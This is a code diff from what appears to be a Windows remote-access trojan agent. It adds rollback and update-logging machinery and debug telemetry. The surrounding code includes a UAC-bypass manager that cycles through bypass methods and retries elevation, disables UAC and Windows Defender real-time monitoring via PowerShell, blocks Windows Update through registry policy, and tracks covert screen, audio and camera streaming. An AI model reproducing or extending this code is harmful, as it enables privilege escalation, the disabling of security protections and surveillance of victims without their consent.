+                    }, level='error')
+                    
+                    # Update status
+                    update_status_reporter.update_status('rollback_failed', {
+                        'backup_id': backup_id,
+                        'error': 'Backup metadata not found',
+                        'timestamp': time.time()
+                    })
+                    
+                    return {
+                        'success': False,
+                        'error': f'Backup metadata not found: {backup_id}'
+                    }
+                
+                # Load backup metadata
+                import json
+                with open(metadata_file, 'r') as f:
+                    backup_info = json.load(f)
+                
+                log_message(f"[ RESTARTING ] Starting rollback to backup: {backup_id}")
+                
+                # Log rollback start
+                update_logger.log_update_activity('rollback_started', {
+                    'message': f'Starting rollback to backup: {backup_id}',
+                    'backup_id': backup_id,
+                    'backup_timestamp': backup_info.get('timestamp'),
+                    'backup_version': backup_info.get('version')
+                })
+                
+                # Update status
+                update_status_reporter.update_status('rollback_started', {
+                    'backup_id': backup_id,
+                    'backup_timestamp': backup_info.get('timestamp'),
+                    'backup_version': backup_info.get('version'),
+                    'timestamp': time.time()
+                })
+                
+                rollback_results = {
+                    'success': True,
+                    'files_restored': 0,
+                    'files_failed': 0,
+                    'errors': []
+                }
+                
+                # Restore each file
+                for rel_path, file_info in backup_info.get('files', {}).items():
+                    try:
+                        backup_file_path = file_info['backup_path']
+                        original_path = file_info['original_path']
+                        
+                        if os.path.exists(backup_file_path):
+                            # Create backup of current file before rollback
+                            if os.path.exists(original_path):
+                                temp_backup = original_path + '.rollback_temp'
+                                import shutil
+                                shutil.copy2(original_path, temp_backup)
+                            
+                            # Restore from backup
+                            shutil.copy2(backup_file_path, original_path)
+                            
+                            # Verify restoration
+                            restored_hash = self._calculate_file_hash(original_path)
+                            if restored_hash == file_info['hash']:
+                                rollback_results['files_restored'] += 1
+                                log_message(f"[ OK ] Restored: {original_path}")
+                            else:
+                                rollback_results['files_failed'] += 1
+                                rollback_results['errors'].append(f"Hash mismatch for {original_path}")
+                                log_message(f"[ ! ] Hash mismatch after restoring: {original_path}")
+                        else:
+                            rollback_results['files_failed'] += 1
+                            rollback_results['errors'].append(f"Backup file not found: {backup_file_path}")
+                            
+                    except Exception as e:
+                        rollback_results['files_failed'] += 1
+                        rollback_results['errors'].append(f"Failed to restore {rel_path}: {str(e)}")
+                        log_message(f"[ X ] Failed to restore {rel_path}: {e}", "error")
+                
+                # Restore state if available
+                if 'state' in backup_info:
+                    self.state_preservation.restore_state(backup_info['state'])
+                
+                # Set overall success
+                rollback_results['success'] = rollback_results['files_failed'] == 0
+                
+                if rollback_results['success']:
+                    log_message(f"[ OK ] Rollback completed successfully: {backup_id}")
+                    
+                    # Log successful rollback
+                    update_logger.log_update_activity('rollback_completed', {
+                        'message': f'Rollback completed successfully: {backup_id}',
+                        'backup_id': backup_id,
+                        'files_restored': rollback_results['files_restored'],
+                        'files_failed': rollback_results['files_failed']
+                    })
+                    
+                    # Update status
+                    update_status_reporter.update_status('rollback_completed', {
+                        'backup_id': backup_id,
+                        'files_restored': rollback_results['files_restored'],
+                        'files_failed': rollback_results['files_failed'],
+                        'timestamp': time.time()
+                    })
+                else:
+                    log_message(f"[ ! ] Rollback completed with errors: {backup_id}")
+                    
+                    # Log rollback with errors
+                    update_logger.log_update_activity('rollback_completed_with_errors', {
+                        'message': f'Rollback completed with errors: {backup_id}',
+                        'backup_id': backup_id,
+                        'files_restored': rollback_results['files_restored'],
+                        'files_failed': rollback_results['files_failed'],
+                        'errors': rollback_results['errors']
+                    }, level='warning')
+                    
+                    # Update status
+                    update_status_reporter.update_status('rollback_completed_with_errors', {
+                        'backup_id': backup_id,
+                        'files_restored': rollback_results['files_restored'],
+                        'files_failed': rollback_results['files_failed'],
+                        'errors': rollback_results['errors'],
+                        'timestamp': time.time()
+                    })
+                
+                return rollback_results
+                
+            except Exception as e:
+                log_message(f"[ X ] Rollback failed: {e}", "error")
+                
+                # Log rollback failure
+                update_logger.log_update_activity('rollback_failed', {
+                    'message': f'Rollback to backup {backup_id} failed: {e}',
+                    'backup_id': backup_id,
+                    'error': str(e)
+                }, level='error')
+                
+                # Update status
+                update_status_reporter.update_status('rollback_failed', {
+                    'backup_id': backup_id,
+                    'error': str(e),
+                    'timestamp': time.time()
+                })
+                
+                return {
+                    'success': False,
+                    'error': str(e)
+                }
+    
+    def get_available_backups(self) -> List[Dict[str, Any]]:
+        """Get list of available backups"""
+        try:
+            backups = []
+            
+            for backup_id in os.listdir(self.backup_dir):
+                backup_path = os.path.join(self.backup_dir, backup_id)
+                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
+                
+                if os.path.exists(metadata_file):
+                    try:
+                        import json
+                        with open(metadata_file, 'r') as f:
+                            metadata = json.load(f)
+                        
+                        backups.append({
+                            'backup_id': backup_id,
+                            'timestamp': metadata.get('timestamp', 0),
+                            'agent_id': metadata.get('agent_id', 'unknown'),
+                            'version': metadata.get('version', 'unknown'),
+                            'file_count': len(metadata.get('files', {}))
+                        })
+                    except Exception as e:
+                        log_message(f"[ ! ] Failed to read backup metadata {backup_id}: {e}", "warning")
+            
+            # Sort by timestamp (newest first)
+            backups.sort(key=lambda x: x['timestamp'], reverse=True)
+            return backups
+            
+        except Exception as e:
+            log_message(f"[ ! ] Failed to get available backups: {e}", "warning")
+            return []
+    
+    def _calculate_file_hash(self, file_path: str) -> str:
+        """Calculate SHA256 hash of a file"""
+        try:
+            import hashlib
+            with open(file_path, 'rb') as f:
+                return hashlib.sha256(f.read()).hexdigest()
+        except Exception as e:
+            log_message(f"[ ! ] Failed to calculate hash for {file_path}: {e}", "warning")
+            return ""
+    
+    def _cleanup_old_backups(self):
+        """Remove old backups beyond the maximum limit"""
+        try:
+            backups = self.get_available_backups()
+            
+            if len(backups) > self.max_backups:
+                # Sort by timestamp (oldest first)
+                backups.sort(key=lambda x: x['timestamp'])
+                
+                # Remove oldest backups
+                to_remove = backups[:-self.max_backups]
+                for backup in to_remove:
+                    try:
+                        backup_path = os.path.join(self.backup_dir, backup['backup_id'])
+                        import shutil
+                        shutil.rmtree(backup_path)
+                        log_message(f"[DEL] Removed old backup: {backup['backup_id']}")
+                    except Exception as e:
+                        log_message(f"[ ! ] Failed to remove backup {backup['backup_id']}: {e}", "warning")
+                        
+        except Exception as e:
+            log_message(f"[ ! ] Failed to cleanup old backups: {e}", "warning")
+
+class StatePreserver:
+    """Manages state preservation during updates"""
+    
+    def __init__(self):
+        # Use a temporary agent ID that will be updated when actual agent starts
+        self.agent_id = "pending"
+        self.state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{self.agent_id}.json')
+    
+    def update_agent_id(self, agent_id: str):
+        """Update the agent ID and state file path"""
+        self.agent_id = agent_id
+        self.state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{self.agent_id}.json')
+    
+    def capture_state(self) -> Dict[str, Any]:
+        """Capture current agent state"""
+        try:
+            state = {
+                'timestamp': time.time(),
+                'agent_id': self.agent_id,
+                'version': VERSION,
+                'connections': {},
+                'active_operations': {},
+                'configuration': {}
+            }
+            
+            # Capture connection state
+            if 'sio' in globals() and sio.connected:
+                state['connections']['socket'] = {
+                    'connected': True,
+                    'connected_at': getattr(sio, 'connected_at', time.time())
+                }
+            
+            # Capture streaming state
+            state['active_operations']['streaming'] = {
+                'screen': screen_streaming_active if 'screen_streaming_active' in globals() else False,
+                'audio': audio_streaming_active if 'audio_streaming_active' in globals() else False,
+                'camera': camera_streaming_active if 'camera_streaming_active' in globals() else False
+            }
+            
+            # Capture configuration
+            if 'agent_config' in globals():
+                state['configuration'] = agent_config.copy()
+            
+            return state
+            
+        except Exception as e:
+            log_message(f"[ ! ] Failed to capture state: {e}", "warning")
+            return {}
+    
+    def restore_state(self, state: Dict[str, Any]):
+        """Restore agent state"""
+        try:
+            log_message("[ RESTARTING ] Restoring agent state...")
+            
+            # Restore configuration
+            if 'configuration' in state and state['configuration']:
+                if 'agent_config' in globals():
+                    agent_config.update(state['configuration'])
+                    log_message("[ OK ] Configuration restored")
+            
+            # Restore streaming operations
+            if 'active_operations' in state and 'streaming' in state['active_operations']:
+                streaming_state = state['active_operations']['streaming']
+                
+                # Restart streams that were active
+                if streaming_state.get('screen'):
+                    log_message("[ RESTARTING ] Restarting screen stream...")
+                    # Screen stream restart logic would go here
+                
+                if streaming_state.get('audio'):
+                    log_message("[ RESTARTING ] Restarting audio stream...")
+                    # Audio stream restart logic would go here
+                
+                if streaming_state.get('camera'):
+                    log_message("[ RESTARTING ] Restarting camera stream...")
+                    # Camera stream restart logic would go here
+            
+            log_message("[ OK ] Agent state restoration completed")
+            
+        except Exception as e:
+            log_message(f"[ ! ] Failed to restore state: {e}", "warning")
+
+# Global rollback manager instance
+rollback_manager = RollbackManager()
+
+# --- Comprehensive Logging and Status Reporting System ---
+class UpdateLogger:
+    """Comprehensive logging system for update activities"""
+    
+    def __init__(self):
+        # Use a temporary agent ID that will be updated when actual agent starts
+        self.agent_id = "pending"
+        self.log_file = os.path.join(tempfile.gettempdir(), f'agent_update_log_{self.agent_id}.json')
+        self.log_entries = []
+        self.log_lock = threading.Lock()
+        self.max_entries = 1000
+    
+    def update_agent_id(self, agent_id: str):
+        """Update the agent ID and log file path"""
+        with self.log_lock:
+            self.agent_id = agent_id
+            self.log_file = os.path.join(tempfile.gettempdir(), f'agent_update_log_{self.agent_id}.json')
+        
+        # Ensure log file exists
+        try:
+            if os.path.exists(self.log_file):
+                with open(self.log_file, 'r') as f:
+                    self.log_entries = json.load(f)
+                    # Keep only recent entries
+                    if len(self.log_entries) > self.max_entries:
+                        self.log_entries = self.log_entries[-self.max_entries:]
+        except Exception:
+            self.log_entries = []
+    
+    def log_update_activity(self, activity_type: str, details: Dict[str, Any], level: str = 'info'):
+        """Log an update activity"""
+        with self.log_lock:
+            entry = {
+                'timestamp': time.time(),
+                'agent_id': get_or_create_agent_id(),
+                'version': VERSION,
+                'activity_type': activity_type,
+                'level': level,
+                'details': details,
+                'pid': os.getpid()
+            }
+            
+            self.log_entries.append(entry)
+            
+            # Keep log size manageable
+            if len(self.log_entries) > self.max_entries:
+                self.log_entries = self.log_entries[-self.max_entries:]
+            
+            # Save to file
+            try:
+                with open(self.log_file, 'w') as f:
+                    json.dump(self.log_entries, f, indent=2)
+            except Exception as e:
+                log_message(f"[ ! ] Failed to save update log: {e}", "warning")
+            
+            # Also log to main log
+            log_message(f"[DATA] Update Activity: {activity_type} - {details.get('message', 'No message')}", level)
+    
+    def get_update_history(self, limit: int = 100, activity_type: str = None) -> List[Dict[str, Any]]:
+        """Get update history"""
+        with self.log_lock:
+            entries = self.log_entries.copy()
+        
+        # Filter by activity type if specified
+        if activity_type:
+            entries = [entry for entry in entries if entry['activity_type'] == activity_type]
+        
+        # Sort by timestamp (newest first)
+        entries.sort(key=lambda x: x['timestamp'], reverse=True)
+        
+        return entries[:limit]
+    
+    def get_update_statistics(self) -> Dict[str, Any]:
+        """Get update statistics"""
+        with self.log_lock:
+            entries = self.log_entries.copy()
+        
+        if not entries:
+            return {
+                'total_updates': 0,
+                'successful_updates': 0,
+                'failed_updates': 0,
+                'rollback_count': 0,
+                'success_rate': 0.0
+            }
+        
+        # Count different activity types
+        update_attempts = len([e for e in entries if e['activity_type'] == 'update_attempt'])
+        successful_updates = len([e for e in entries if e['activity_type'] == 'update_success'])
+        failed_updates = len([e for e in entries if e['activity_type'] == 'update_failed'])
+        rollbacks = len([e for e in entries if e['activity_type'] == 'rollback'])
+        
+        # Calculate success rate
+        success_rate = (successful_updates / update_attempts * 100) if update_attempts > 0 else 0.0
+        
+        return {
+            'total_updates': update_attempts,
+            'successful_updates': successful_updates,
+            'failed_updates': failed_updates,
+            'rollback_count': rollbacks,
+            'success_rate': round(success_rate, 2),
+            'last_update': max(entries, key=lambda x: x['timestamp'])['timestamp'] if entries else 0
+        }
+
+class UpdateStatusReporter:
+    """Real-time status reporting for update operations"""
+    
+    def __init__(self):
+        self.current_status = {}
+        self.status_lock = threading.Lock()
+        self.status_callbacks = []
+    
+    def update_status(self, status_type: str, status_data: Dict[str, Any]):
+        """Update current status"""
+        with self.status_lock:
+            self.current_status[status_type] = {
+                'timestamp': time.time(),
+                'data': status_data
+            }
+            
+            # Notify callbacks
+            for callback in self.status_callbacks:
+                try:
+                    callback(status_type, status_data)
+                except Exception as e:
+                    log_message(f"[ ! ] Status callback error: {e}", "warning")
+            
+            # Emit status update via Socket.IO if connected
+            self._emit_status_update(status_type, status_data)
+    
+    def get_current_status(self) -> Dict[str, Any]:
+        """Get current status"""
+        with self.status_lock:
+            return self.current_status.copy()
+    
+    def add_status_callback(self, callback):
+        """Add a status callback"""
+        with self.status_lock:
+            self.status_callbacks.append(callback)
+    
+    def remove_status_callback(self, callback):
+        """Remove a status callback"""
+        with self.status_lock:
+            if callback in self.status_callbacks:
+                self.status_callbacks.remove(callback)
+    
+    def _emit_status_update(self, status_type: str, status_data: Dict[str, Any]):
+        """Emit status update via Socket.IO"""
+        try:
+            if 'sio' in globals() and sio.connected:
+                status_payload = {
+                    'type': status_type,
+                    'data': status_data,
+                    'timestamp': time.time(),
+                    'agent_id': get_or_create_agent_id()
+                }
+                
+                sio.emit('update_status', status_payload)
+                log_message(f"[NET] Status update emitted: {status_type}")
+                
+        except Exception as e:
+            log_message(f"[ ! ] Failed to emit status update: {e}", "warning")
+
+# Global logging and status reporting instances
+update_logger = UpdateLogger()
+update_status_reporter = UpdateStatusReporter()
 
 # --- Background Initialization System ---
 class BackgroundInitializer:
@@ -1459,7 +3330,7 @@ class BackgroundInitializer:
 
             return "no_elevation_needed"
         except Exception as e:
-            debug_print(f"❌ [PRIVILEGE ESCALATION] EXCEPTION: {e}")
+            debug_print(f"[ X ] [PRIVILEGE ESCALATION] EXCEPTION: {e}")
             import traceback
             traceback.print_exc()
             return f"privilege_escalation_error: {e}"
@@ -1578,19 +3449,22 @@ class UACBypassMethod:
     
     def execute(self) -> bool:
         """Execute the UAC bypass method with enhanced error handling"""
+        emit_bypass_test_debug(self.method_id, self.name, action='start', status='pending', point='execute.enter')
         try:
             if should_skip_uac_method(self.method_id, self.name):
                 log_message(f"[UAC BYPASS] Skipping method: {self.name}", "warning")
+                emit_bypass_test_debug(self.method_id, self.name, action='skip', status='skipped', reason='precheck_skip', point='execute.precheck')
                 return False
         except Exception:
             pass
         debug_print(f"  [METHOD] Checking if {self.name} is available...")
         
         if not self.is_available():
-            debug_print(f"  ❌ [METHOD] {self.name} NOT AVAILABLE on this system")
+            debug_print(f"  [ X ] [METHOD] {self.name} NOT AVAILABLE on this system")
+            emit_bypass_test_debug(self.method_id, self.name, action='availability', status='skipped', reason='not_available', point='execute.availability')
             raise UACBypassError(f"{self.name} not available on this system")
         
-        debug_print(f"  ✅ [METHOD] {self.name} is AVAILABLE")
+        debug_print(f"  [ OK ] [METHOD] {self.name} is AVAILABLE")
         if UAC_BYPASS_DEBUG_MODE:
             log_message(f"[UAC BYPASS DEBUG] {self.name} starting in full debug mode", "warning")
         
@@ -1602,22 +3476,25 @@ class UACBypassMethod:
                 result = self._execute_bypass()
                 
                 if result:
-                    debug_print(f"  ✅✅✅ [METHOD] {self.name} SUCCESS!")
-                    log_message(f"✅ [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
+                    debug_print(f"  [ OK ][ OK ][ OK ] [METHOD] {self.name} SUCCESS!")
+                    log_message(f"[ OK ] [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
+                    emit_bypass_test_debug(self.method_id, self.name, action='result', status='success', point='execute.result')
                 else:
-                    debug_print(f"  ❌ [METHOD] {self.name} returned False")
+                    debug_print(f"  [ X ] [METHOD] {self.name} returned False")
                     log_message(f"[UAC BYPASS] Method {self.name} returned False", "warning")
+                    emit_bypass_test_debug(self.method_id, self.name, action='result', status='failed', point='execute.result')
                 
                 return result
                 
             except Exception as e:
-                debug_print(f"  ❌ [METHOD] {self.name} EXCEPTION: {e}")
+                debug_print(f"  [ X ] [METHOD] {self.name} EXCEPTION: {e}")
                 log_message(f"[UAC BYPASS] Method {self.name} failed: {e}", "error")
                 try:
                     if maybe_enable_bypass_debugging():
                         log_message(f"[UAC BYPASS DEBUG] Defender detection active; debug mode enabled for {self.name}", "warning")
                 except Exception:
                     pass
+                emit_bypass_test_debug(self.method_id, self.name, action='error', status='error', reason=str(e), point='execute.exception')
                 raise UACBypassError(f"{self.name} failed: {e}")
     
     def _execute_bypass(self) -> bool:
@@ -1657,7 +3534,7 @@ class UACBypassManager:
         debug_print("[UAC MANAGER] Creating UACBypassManager instance...")
         debug_print("[UAC MANAGER] Creating RLock (should be patched by eventlet)...")
         self._lock = threading.RLock()
-        debug_print("✅ [UAC MANAGER] RLock created successfully")
+        debug_print("[ OK ] [UAC MANAGER] RLock created successfully")
         
         self.methods = {}
         debug_print("[UAC MANAGER] Calling _initialize_methods()...")
@@ -1675,7 +3552,7 @@ class UACBypassManager:
             'wsreset',
             'winsat'
         ]
-        debug_print("✅ [UAC MANAGER] UACBypassManager fully initialized")
+        debug_print("[ OK ] [UAC MANAGER] UACBypassManager fully initialized")
     
     def _initialize_methods(self):
         """Initialize all UAC bypass methods"""
@@ -1699,7 +3576,7 @@ class UACBypassManager:
             debug_print(f"  Registering method: {name}")
             self.methods[name] = method
         
-        debug_print(f"✅ [UAC MANAGER] Registered {len(self.methods)} UAC bypass methods")
+        debug_print(f"[ OK ] [UAC MANAGER] Registered {len(self.methods)} UAC bypass methods")
         log_message(f"[UAC MANAGER] Initialized {len(self.methods)} UAC bypass methods", "info")
     
     def get_available_methods(self) -> list:
@@ -1732,7 +3609,7 @@ class UACBypassManager:
                 result = method.execute()
                 
                 if result:
-                    log_message(f"✅ [UAC MANAGER] Method '{method_name}' succeeded!", "success")
+                    log_message(f"[ OK ] [UAC MANAGER] Method '{method_name}' succeeded!", "success")
                 else:
                     log_message(f"[UAC MANAGER] Method '{method_name}' failed", "warning")
                 
@@ -1755,7 +3632,7 @@ class UACBypassManager:
             available_methods = self.get_available_methods()
             
             if not available_methods:
-                debug_print("❌ [UAC MANAGER] No UAC bypass methods available")
+                debug_print("[ X ] [UAC MANAGER] No UAC bypass methods available")
                 log_message("[UAC MANAGER] No UAC bypass methods available", "warning")
                 return False
             
@@ -1773,26 +3650,26 @@ class UACBypassManager:
                     
                     if result:
                         debug_print("=" * 80)
-                        debug_print(f"✅ [UAC MANAGER] SUCCESS! Method '{method_name}' worked!")
+                        debug_print(f"[ OK ] [UAC MANAGER] SUCCESS! Method '{method_name}' worked!")
                         debug_print("=" * 80)
-                        log_message(f"✅ [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
+                        log_message(f"[ OK ] [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
                         return True
                     else:
-                        debug_print(f"❌ [UAC MANAGER] Method '{method_name}' FAILED")
+                        debug_print(f"[ X ] [UAC MANAGER] Method '{method_name}' FAILED")
                         try:
                             maybe_enable_bypass_debugging()
                         except Exception:
                             pass
                         
                 except Exception as e:
-                    debug_print(f"❌ [UAC MANAGER] EXCEPTION in method '{method_name}': {e}")
+                    debug_print(f"[ X ] [UAC MANAGER] EXCEPTION in method '{method_name}': {e}")
                     log_message(f"[UAC MANAGER] Error trying method '{method_name}': {e}", "error")
                     continue
             
             debug_print("=" * 80)
-            debug_print("❌ [UAC MANAGER] ALL METHODS FAILED!")
+            debug_print("[ X ] [UAC MANAGER] ALL METHODS FAILED!")
             debug_print("=" * 80)
-            log_message("[UAC MANAGER] ❌ All UAC bypass methods failed", "error")
+            log_message("[UAC MANAGER] [ X ] All UAC bypass methods failed", "error")
             return False
     
     def run_as_admin(self) -> bool:
@@ -2322,13 +4199,13 @@ def is_admin():
             result = ctypes.windll.shell32.IsUserAnAdmin()
             if UAC_PRIVILEGE_DEBUG:
                 if result:
-                    debug_print("✅ [ADMIN CHECK] Running as ADMINISTRATOR")
+                    debug_print("[ OK ] [ADMIN CHECK] Running as ADMINISTRATOR")
                 else:
-                    debug_print("❌ [ADMIN CHECK] Running as NORMAL USER (not admin)")
+                    debug_print("[ X ] [ADMIN CHECK] Running as NORMAL USER (not admin)")
             return result
         except (AttributeError, OSError) as e:
             if UAC_PRIVILEGE_DEBUG:
-                debug_print(f"❌ [ADMIN CHECK] Failed to check admin status: {e}")
+                debug_print(f"[ X ] [ADMIN CHECK] Failed to check admin status: {e}")
             return False
     else:
         result = os.geteuid() == 0
@@ -2436,6 +4313,7 @@ def ensure_registry_policies_and_context_menu():
 
 def apply_registry_action(action_key: str, enabled: bool) -> bool:
     try:
+        emit_bypass_test_debug(None, f"registry:{action_key}", action='start', status='pending', point='registry.enter', extra={'kind': 'registry_action', 'action_key': action_key, 'enabled': bool(enabled)})
         import winreg
         if action_key == 'policy_push_notifications':
             try:
@@ -2443,9 +4321,11 @@ def apply_registry_action(action_key: str, enabled: bool) -> bool:
                 val = 1 if enabled else 0
                 winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, val)
                 winreg.CloseKey(k)
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                 return True
             except Exception as e:
                 log_message(f"[REGISTRY] PushNotifications policy error: {e}", "warning")
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                 return False
         if action_key == 'policy_windows_update':
             try:
@@ -2453,9 +4333,11 @@ def apply_registry_action(action_key: str, enabled: bool) -> bool:
                 val = 1 if enabled else 0
                 winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, val)
                 winreg.CloseKey(k)
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                 return True
             except Exception as e:
                 log_message(f"[REGISTRY] WindowsUpdate policy error: {e}", "warning")
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                 return False
         if action_key == 'context_runas_cmd':
             try:
@@ -2477,9 +4359,11 @@ def apply_registry_action(action_key: str, enabled: bool) -> bool:
                         winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
                     except Exception:
                         pass
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                 return True
             except Exception as e:
                 log_message(f"[REGISTRY] Context menu runas error: {e}", "warning")
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                 return False
         if action_key == 'context_powershell_admin':
             try:
@@ -2501,26 +4385,34 @@ def apply_registry_action(action_key: str, enabled: bool) -> bool:
                         winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
                     except Exception:
                         pass
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                 return True
             except Exception as e:
                 log_message(f"[REGISTRY] Context menu PowershellAdmin error: {e}", "warning")
+                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                 return False
         if action_key == 'disableRealtimeMonitoring':
             try:
                 if enabled:
-                    return bool(disable_realtime_monitoring_before_uac())
+                    ok = bool(disable_realtime_monitoring_before_uac())
+                    emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success' if ok else 'failed', point='registry.result', extra={'enabled': True})
+                    return ok
                 else:
                     try:
                         subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
+                        emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': False})
                         return True
                     except Exception as e:
                         log_message(f"[DEFENDER] EnableRealtimeMonitoring failed: {e}", "warning")
+                        emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                         return False
             except Exception:
                 return False
+        emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='failed', point='registry.result', extra={'enabled': bool(enabled)})
         return False
     except Exception as e:
         log_message(f"[REGISTRY] apply_registry_action error: {e}", "error")
+        emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
         return False
 
 def disable_realtime_monitoring_before_uac():
@@ -2599,7 +4491,7 @@ def keep_trying_elevation():
     
     while retry_count < max_retries:
         if is_admin():
-            log_message("✅ [ELEVATION] Successfully gained admin privileges!")
+            log_message("[ OK ] [ELEVATION] Successfully gained admin privileges!")
             # Immediately disable UAC
             disable_uac()
             if DEFENDER_DISABLE_ENABLED:
@@ -2613,45 +4505,50 @@ def keep_trying_elevation():
         
         # Try UAC bypass methods again
         if attempt_uac_bypass():
-            log_message("✅ [ELEVATION] UAC bypass successful on retry {retry_count}!")
+            log_message("[ OK ] [ELEVATION] UAC bypass successful on retry {retry_count}!")
             disable_uac()
             return
         
         # Wait before next retry
         time.sleep(retry_interval)
     
-    log_message(f"⚠️ [ELEVATION] Failed to gain admin after {max_retries} attempts")
+    log_message(f"[ ! ] [ELEVATION] Failed to gain admin after {max_retries} attempts")
 
 def attempt_uac_bypass():
     """Attempt to bypass UAC using the ADVANCED UAC Manager."""
     try:
         global DISABLE_UAC_BYPASS, UAC_BYPASS_ALLOWED
         if DISABLE_UAC_BYPASS or not UAC_BYPASS_ALLOWED:
+            emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='disabled_or_not_allowed', point='attempt.global_gate')
             return False
     except Exception:
         pass
     debug_print("=" * 80)
     debug_print("[UAC BYPASS] attempt_uac_bypass() called")
     debug_print("=" * 80)
+    emit_bypass_test_debug(None, 'global', action='start', status='pending', point='attempt.enter')
     try:
         emit_security_notification('info', 'UAC Bypass Attempt', 'Attempting elevation')
     except Exception:
         pass
     
     if not WINDOWS_AVAILABLE:
-        debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
+        debug_print("[ X ] [UAC BYPASS] Not Windows - bypass not available")
+        emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='not_windows', point='attempt.platform_check')
         return False
     try:
         if should_skip_uac_method():
             log_message("[UAC BYPASS] Skipped due to Windows Defender detection", "warning")
+            emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='defender_detection', point='attempt.defender_check')
             return False
     except Exception:
         pass
     
     debug_print("[UAC BYPASS] Checking if already admin...")
     if is_admin():
-        debug_print("✅ [UAC BYPASS] Already admin - no bypass needed")
+        debug_print("[ OK ] [UAC BYPASS] Already admin - no bypass needed")
         log_message("[UAC BYPASS] Already running as admin", "info")
+        emit_bypass_test_debug(None, 'global', action='skip', status='skipped', reason='already_admin', point='attempt.admin_check')
         return True
     
     debug_print("[UAC BYPASS] Not admin - starting UAC bypass...")
@@ -2670,11 +4567,12 @@ def attempt_uac_bypass():
     debug_print("[UAC BYPASS] Initializing UAC Manager...")
     try:
         manager = get_uac_manager()
-        debug_print(f"✅ [UAC BYPASS] UAC Manager initialized with {len(manager.methods)} methods")
+        debug_print(f"[ OK ] [UAC BYPASS] UAC Manager initialized with {len(manager.methods)} methods")
     except Exception as e:
-        debug_print(f"❌ [UAC BYPASS] UAC Manager initialization FAILED: {e}")
+        debug_print(f"[ X ] [UAC BYPASS] UAC Manager initialization FAILED: {e}")
         import traceback
         traceback.print_exc()
+        emit_bypass_test_debug(None, 'global', action='error', status='error', reason=str(e), point='attempt.manager_init')
         return False
     
     debug_print("[UAC BYPASS] Calling manager.try_all_methods()...")
@@ -2682,8 +4580,8 @@ def attempt_uac_bypass():
     
     if result:
         debug_print("=" * 80)
-        debug_print("✅ [UAC BYPASS] Elevated instance launched successfully!")
-        debug_print("✅ [UAC BYPASS] Checking if THIS process gained admin...")
+        debug_print("[ OK ] [UAC BYPASS] Elevated instance launched successfully!")
+        debug_print("[ OK ] [UAC BYPASS] Checking if THIS process gained admin...")
         debug_print("=" * 80)
         
         # Important: UAC bypass launches a NEW elevated instance
@@ -2692,8 +4590,8 @@ def attempt_uac_bypass():
         
         if is_admin():
             # Somehow THIS process became admin (unusual but possible)
-            debug_print("✅ [UAC BYPASS] THIS process is now admin!")
-            log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
+            debug_print("[ OK ] [UAC BYPASS] THIS process is now admin!")
+            log_message("[ OK ] [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
             try:
                 emit_security_notification('success', 'UAC Bypass Successful', 'Admin privileges gained')
             except Exception:
@@ -2702,34 +4600,37 @@ def attempt_uac_bypass():
                 perform_post_admin_actions()
             except Exception:
                 pass
+            emit_bypass_test_debug(None, 'global', action='result', status='success', point='attempt.result')
             return True
         else:
             # A separate elevated instance was launched
             # This current process is still NOT admin
-            debug_print("⚠️ [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
-            debug_print("⚠️ [UAC BYPASS] The elevated instance will take over")
-            log_message("⚠️ [UAC BYPASS] Elevated instance launched", "warning")
+            debug_print("[ ! ] [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
+            debug_print("[ ! ] [UAC BYPASS] The elevated instance will take over")
+            log_message("[ ! ] [UAC BYPASS] Elevated instance launched", "warning")
             
             if KEEP_ORIGINAL_PROCESS:
                 # Keep running (useful for debugging or manual operation)
-                debug_print("ℹ️ [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
-                debug_print("ℹ️ [UAC BYPASS] Note: Both non-admin and admin instances are now running")
-                log_message("ℹ️ Original process will continue running alongside elevated instance", "info")
-                return True  # Consider it successful, continue running
+                debug_print("[i] [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                debug_print("[i] [UAC BYPASS] Note: Both non-admin and admin instances are now running")
+                log_message("[i] Original process will continue running alongside elevated instance", "info")
